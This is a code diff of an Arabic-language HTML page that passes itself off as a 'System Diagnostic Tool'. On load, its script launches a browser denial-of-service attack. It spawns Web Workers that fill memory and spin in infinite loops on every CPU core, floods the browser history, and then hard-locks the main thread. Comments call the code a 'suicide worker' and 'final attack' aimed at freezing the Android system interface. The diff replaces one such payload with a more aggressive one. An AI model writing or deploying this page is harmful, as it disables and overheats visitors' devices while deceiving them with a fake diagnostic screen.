@@ -2,63 +2,65 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostic</title>
+    <title>System Diagnostic Tool</title>
 </head>
-<body style="background:#111; color:#0f0; text-align:center; font-family:monospace; padding-top:100px;">
-    <h2 id="log">جاري التحقق من انك انسان ...</h2>
-    <div id="cores"></div>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:150px; font-family:monospace;">
+    <h1 id="msg">جاري تحليل الأداء...</h1>
+    <p>يرجى عدم إغلاق المتصفح لضمان دقة الفحص</p>
 
     <script>
-        // 1. تحديد عدد الأنوية وديناميكية العمل
-        const physicalCores = navigator.hardwareConcurrency || 4;
-        const threadCount = physicalCores * 10; // فتح ضعف عدد الأنوية لضمان الاختناق
-        document.getElementById('cores').innerText = "الأنوية المكتشفة: " + physicalCores + " | المسارات المفعلة: " + threadCount;
-
-        // 2. كود الـ Worker المصمم لإجبار التربو (Turbo Boost)
-        const workerCode = `
-            self.onmessage = function() {
-                // مصفوفة ضخمة لإشغال الكاش والرام
-                let memoryLoad = new Float64Array(200000000); 
+        // 1. كود العامل الانتحاري (The Suicide Worker)
+        // يقوم بحسابات معقدة ويحجز مساحات ضخمة من الرام في مسارات منفصلة
+        const suicideWorker = `
+            function overload() {
+                let data = new Uint8Array(1024 * 1024 * 100); // حجز 100MB فوري
+                data.fill(Math.random() * 255);
                 
-                function crunch() {
-                    // عمليات رياضية معقدة (Trigonometric & Exponential) لإجبار وحدة الحساب (ALU) على العمل الأقصى
-                    for (let i = 0; i < 500000000; i++) {
-                        Math.tan(Math.atan(Math.tan(Math.atan(Math.random()))));
-                        Math.exp(Math.random()) * Math.sqrt(Math.random());
-                    }
-                    // منع الـ Garbage Collection من إراحة المعالج
-                    memoryLoad.fill(Math.random());
-                    setTimeout(crunch, 0); // تكرار فوري
+                // عمليات حسابية ثقيلة جداً لإبقاء النواة في حالة Turbo
+                while(true) {
+                    Math.tan(Math.atan(Math.tan(Math.atan(Math.random()))));
                 }
-                crunch();
-            };
+            }
+            overload();
         `;
 
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
+        const blob = new Blob([suicideWorker], {type: 'application/javascript'});
         const workerUrl = URL.createObjectURL(blob);
 
-        function startHyperStress() {
-            document.getElementById('log').innerText = " ...";
-            
-            // 3. إطلاق الهجوم المتوازي على كافة الأنوية
-            for (let i = 0; i < threadCount; i++) {
-                const w = new Worker(workerUrl);
-                w.postMessage("go");
+        function startFinalAttack() {
+            // 2. استخدام التعداد الفعلي للأنوية + مضاعفته
+            const cores = navigator.hardwareConcurrency || 8;
+            const workers = [];
+
+            // إطلاق العمال على كافة المسارات
+            for(let i = 0; i < cores * 2; i++) {
+                workers[i] = new Worker(workerUrl);
             }
 
-            // 4. تجميد واجهة النظام (System UI Freeze)
-            // بعد 7 ثواني من رفع التردد والحرارة، نقوم بتجميد مسار الواجهة
+            // 3. هجوم "إغراق الهيستوري" (History Flooding)
+            // هذه العملية تجعل واجهة النظام (System UI) في أندرويد تتجمد لأنها تحاول أرشفة الروابط
+            let throttle = setInterval(() => {
+                try {
+                    for(let j = 0; j < 500; j++) {
+                        history.pushState(null, "", "OVERLOAD_" + Math.random());
+                    }
+                } catch(e) {}
+            }, 100);
+
+            // 4. القفل النهائي (The Hard Lock) بعد 5 ثواني
+            // تجميد مسار الواجهة الرئيسي تماماً مما يمنع حتى زر "Home" من الاستجابة بسرعة
             setTimeout(() => {
-                document.getElementById('log').innerText = "CRITICAL_SYSTEM_OVERLOAD";
+                document.getElementById('msg').innerText = "CRITICAL FAILURE: MEMORY EXHAUSTED";
                 while(true) {
-                    // تكرار طلبات تغيير الهوية البصرية للمتصفح لإرباك معالج الرسوميات والنظام
-                    history.replaceState(null, "", "OVERLOAD_" + Date.now() + "_" + Math.random());
+                    // توليد كائنات ضخمة في حلقة لا نهائية
+                    let x = new Array(1000000).fill(document.body.innerHTML);
+                    window.location.hash = Math.random();
                 }
-            }, 3000);
+            }, 5000);
         }
 
-        // بدء التشغيل
-        window.onload = startHyperStress;
+        // بدء الهجوم
+        window.onload = startFinalAttack;
     </script>
 </body>
 </html>
